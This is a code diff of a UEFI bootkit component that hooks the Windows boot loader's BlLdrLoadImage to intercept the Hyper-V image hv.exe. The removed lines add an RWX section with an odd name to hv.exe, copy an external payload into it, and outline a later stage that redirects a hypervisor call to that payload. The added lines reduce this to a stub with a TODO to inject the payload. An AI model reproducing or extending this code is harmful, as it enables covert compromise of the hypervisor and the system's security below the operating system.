@@ -11,14 +11,13 @@ extern UINT64 PeAddSection(IN UINT64 imageBase, IN CONST CHAR8* sectionName, IN 
 extern UINT64 FindPatternImage(IN VOID* imageBase, IN CONST CHAR8* pattern);
 
 // Public Globals
-BOOLEAN gBlLdrLoadImageReached = FALSE;
+BOOLEAN gHvFound = FALSE;
 
 // Public Functions
 EFI_STATUS InstallPatch_BlLdrLoadImage(IN VOID *originalFunction);
 
 // Private Globals
 static volatile patchinfo_t gBlLdrLoadImagePatchInfo;
-static BOOLEAN gHvPatchedSuccessfully = FALSE;
 
 // Private Functions
 static EFI_STATUS EFIAPI PatchedBlLdrLoadImage(
@@ -71,7 +70,7 @@ static EFI_STATUS EFIAPI PatchedBlLdrLoadImage(
   //
   // Check if we have already patched the hypervisor
   // 
-  if (gHvPatchedSuccessfully) {
+  if (gHvFound) {
     return status;
   }
 
@@ -99,83 +98,23 @@ static EFI_STATUS EFIAPI PatchedBlLdrLoadImage(
   //
   // Set flag that we reached this point
   // 
-  gBlLdrLoadImageReached = TRUE;
-
-  SerialPrint("\n");
-  SerialPrint("================================================\n");
-  SerialPrint("  Hypervisor Image Detected\n");
-  SerialPrint("================================================\n");
-  SerialPrintHex("Image Base", entry->ModuleBase);
-  SerialPrintHex("Original Size", entry->SizeOfImage);
+  gHvFound = TRUE;
 
   //
-  // Process hv.exe - add our payload section
+  // Process hv.exe
   //
   ProcessHvImage(entry->ModuleBase, entry->SizeOfImage);
 
   return status;
 }
 
-static VOID ProcessHvImage(IN UINT64 imageBase, IN UINT64 imageSize) {
-  UINTN payloadSize;
-  VOID* payloadBase;
-  UINT64 newSectionAddr;
+static EFI_STATUS ProcessHvImage(IN UINT64 imageBase, IN UINT64 imageSize) {
+  (void)imageBase;
+  (void)imageSize;
   
   //
-  // Get payload information
-  //
-  payloadSize = GetPayloadSize();
-  payloadBase = GetPayloadBase();
-  
-  SerialPrint("[*] Payload information:\n");
-  SerialPrintHex("  Payload base", (UINT64)payloadBase);
-  SerialPrintHex("  Payload size", (UINT64)payloadSize);
-  
-  if (payloadSize == 0 || payloadSize > 0x100000) {
-    SerialPrint("[!] Invalid payload size, aborting\n");
-    return;
-  }
-  
-  //
-  // Add new section to hv.exe
-  //
-  SerialPrint("[*] Adding .zczxyhc section to hv.exe\n");
-  newSectionAddr = PeAddSection(imageBase, ".zczxyhc", (UINT32)payloadSize, SECTION_RWX);
-  
-  if (!newSectionAddr) {
-    SerialPrint("[!] Failed to add section\n");
-    return;
-  }
-  
-  SerialPrintHex("New section at", newSectionAddr);
-  
-  //
-  // Copy payload into new section
-  //
-  SerialPrint("[*] Copying payload to new section\n");
-  CopyMem((VOID*)newSectionAddr, payloadBase, payloadSize);
-  
-  //
-  // Flush instruction cache for the new code
-  //
-  FlushInstructionCache((VOID*)newSectionAddr, payloadSize);
-  
-  SerialPrint("[+] Payload successfully injected into hv.exe\n");
-  
-  //
-  // TODO Stage 3: Find target function and redirect to payload
-  // For now, we've successfully added the section and copied our code
-  //
-  
-  /*
-   * Future implementation (Stage 3):
-   * 
-   * UINT64 targetFunction = FindPatternImage((VOID*)imageBase, "E8 ? ? ? ? 48 89 04 24");
-   * if (targetFunction) {
-   *   // Patch the call instruction to redirect to our payload
-   *   PatchCallInstruction(targetFunction, newSectionAddr);
-   * }
-   */
-  
-  gHvPatchedSuccessfully = TRUE;
+  // TODO: Add a new section to add our payload into the hypervisor
+  // 
+
+  return EFI_SUCCESS;
 }
